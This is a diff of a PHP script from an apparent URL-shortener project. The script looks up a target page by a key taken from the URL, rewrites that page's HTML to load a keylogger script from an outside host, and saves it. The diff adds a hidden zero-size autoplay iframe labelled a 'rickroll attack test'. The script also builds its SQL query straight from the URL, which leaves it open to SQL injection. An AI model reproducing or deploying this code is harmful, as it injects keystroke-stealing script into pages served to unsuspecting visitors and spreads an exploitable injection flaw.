@@ -15,7 +15,8 @@ if ($conn->connect_error) {
 
 //SEARCHING DATABASE WITH KEY TO GET LONGLINK
 $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-$key = substr($actual_link , 34, strlen($actual_link));
+$key = substr(strrchr($actual_link, "/"), 1);
+echo $key;
 $sql = "SELECT longlink FROM DATA WHERE shortlink='{$key}'";
 $result = $conn->query($sql);
 $arrayOfResults = mysqli_fetch_row($result);
@@ -44,11 +45,10 @@ foreach($html->find('img') as $element){
 		}
 
 	};
-
-
 //ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
+//ADDING RICKROLL ATTACK TEST
 $keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
-$textToInsert="script src='$keyloggerscript'></script>";
+$textToInsert="script src='$keyloggerscript'></script>"."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
 $contents = file_get_contents("$htmlFileName");
 $newContent = preg_replace("</body>", $textToInsert."</body", $contents);
 file_put_contents($htmlFileName, $newContent);
